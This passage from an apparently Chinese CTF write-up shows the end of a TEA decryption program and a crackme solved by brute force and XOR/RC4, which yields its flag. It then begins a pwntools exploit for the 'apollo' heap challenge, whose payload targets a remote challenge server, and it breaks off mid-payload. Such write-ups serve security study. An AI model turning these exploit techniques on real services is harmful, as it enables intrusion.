&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xedf5d910&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x542702cb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//还有一组对照的 改一下就行
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10203&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4050607&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8090a0b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc0d0e0f&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//num_rounds建议取值为32
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// v为要加密的数据是两个32位无符号整数
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;加密前原始数据：0x%x 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;加密后的数据：0x%x 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;decipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;解密后的数据：0x%x 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;crackme&#34;&gt;Crackme&lt;/h3&gt;
&lt;p&gt;输入17个字符分成7和10，又输入一个数要满足&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210403190710.PNG&#34; alt=&#34;捕获&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;爆破就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//一个除 一个%
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;nmsl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12379&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nmsl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;100.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;total&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;total&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x5a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//total == 0x13b03 
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;i == %d ,  x== 0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;total&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//99038
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前7个和 99038生成的数组xor ,后面10个 rc4,总的来说都是xor ，找到要xor的数就行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; &amp;gt; a = &amp;quot;9903819&amp;quot;
&amp;gt;&amp;gt; &amp;gt; x = [0x8, 0x4d, 0x59, 0x06, 0x73, 0x02, 0x40]
&amp;gt;&amp;gt; &amp;gt; c = &amp;quot;&amp;quot;
&amp;gt;&amp;gt; &amp;gt; for i in range(7) :
	...    c += chr(ord(a[i]) ^ x[i])
	...
	&amp;gt;&amp;gt; &amp;gt; c
	&#39;1ti5K3y&#39;
	&amp;gt;&amp;gt; &amp;gt; s = [0xb2, 0xd6, 0x8e, 0x3f, 0xaa, 0x14, 0x53, 0x54, 0xc6, 0x06]
	&amp;gt;&amp;gt; &amp;gt; key = [0xe0, 0x95, 0xba, 0x60, 0xc9, 0x66, 0x2a, 0x24, 0xb2, 0x36]
	&amp;gt;&amp;gt; &amp;gt; d = &amp;quot;&amp;quot;
	&amp;gt;&amp;gt; &amp;gt; for i in range(10) :
	...   d += chr(s[i] ^ key[i])
	...
	&amp;gt;&amp;gt; &amp;gt; c + d
	&#39;1ti5K3yRC4_crypt0&#39;
	&amp;gt;&amp;gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;h3 id=&#34;apollo&#34;&gt;apollo&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding=utf-8&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;func_table:	  [0x14018 + proc_base]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;opcode_table: [0x13FE8 + proc_base]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x0: 0x4D-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		   calloc(location,1);
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		   calloc(timeS,1);
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           opcode +=3;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;			
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x1: 0x2A-&amp;gt;add;just one times;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           p8(index0) + p8(index1)+p16(Size); opcode+=5
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x2: 0x2F-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           free();
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           p8(index0) + p8(index1); opcode+=3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x3: 0x2B-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           Set the Location;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           p8(index0) + p8(index1) + p8(Location); opcode+=4
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           1 &amp;lt; Size &amp;lt;= 4;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x4: 0x2D-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           Set the Location into 0;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           p8(index0) + p8(index1); opcode +=3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0 0 0 0 0 0 0 0 0 0
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x5: 0x77-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           opcode++; Up   -&amp;gt;2、3-&amp;gt;2; or 0-&amp;gt;1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x6: 0x73-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           opcode++; Down -&amp;gt;2、3-&amp;gt;2; or 0-&amp;gt;1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x7: 0x61-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           opcode++; Left -&amp;gt;2、3-&amp;gt;2; or 0-&amp;gt;1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x8: 0x64-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           opcode++; Right-&amp;gt;2、3-&amp;gt;2; or 0-&amp;gt;1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0x9: 0x70-&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;           show;opcode++;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0xA: 0x00-&amp;gt;Exit
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;0xB: 0x01-&amp;gt;default;opcode++;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#p = process([&amp;#39;qemu-aarch64&amp;#39;,&amp;#39;-g&amp;#39;,&amp;#39;5555&amp;#39;,&amp;#39;-L&amp;#39;,&amp;#39;.&amp;#39;,&amp;#39;./main&amp;#39;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;8.140.179.11&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13422&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x4D\x10\x10&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#init_All_Var&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x04\xF0\x04&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x05\x10\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 1&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2F\x00\x04&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#delete 0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A\x00\x04\xF0\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Add 0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x70&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x73&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xE&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x64\x61&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x36&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x64&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2B\x0E\x07\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x64&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
